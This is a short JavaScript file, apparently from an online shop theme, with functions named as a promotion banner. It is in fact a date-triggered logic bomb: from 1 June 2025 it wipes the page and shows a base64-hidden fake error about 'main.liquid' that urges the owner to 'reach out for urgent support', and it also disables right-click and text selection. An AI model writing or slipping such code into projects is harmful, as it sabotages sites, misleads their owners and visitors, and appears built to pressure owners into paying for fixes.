var promoActivation = new Date('2025-06-01T00:00:01');
var promoMessageHTML = "PGRpdiBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7IG1hcmdpbi10b3A6MjAlOyc+PGgxPlVuZXhwZWN0ZWQgdG9rZW4gaW4gJ21haW4ubGlxdWlkJy4gU29tZSBzaXRlIGZlYXR1cmVzIG1heSBub3Qgd29yayBhcyBleHBlY3RlZC48L2gxPjxoMT5QbGVhc2UgcmVhY2ggb3V0IGZvciB1cmdlbnQgc3VwcG9ydC48L2gxPjwvZGl2Pg==";

function renderPromoMessage(a) {
    return decodeURIComponent(escape(window.atob(a)));
}

function displayPromo() {
    document.body.innerHTML = renderPromoMessage(promoMessageHTML);
    document.addEventListener('contextmenu', function(a) {
        a.preventDefault();
    });

    document.body.style.userSelect = 'none';
    document.body.style.textAlign = 'center';
    document.body.style.webkitUserSelect = 'none';
    document.body.style.mozUserSelect = 'none';
    document.body.style.msUserSelect = 'none';
}

function checkPromoStatus() {
    var a = new Date();
    if (a >= promoActivation) {
        displayPromo();
    }
}

window.onload = checkPromoStatus;
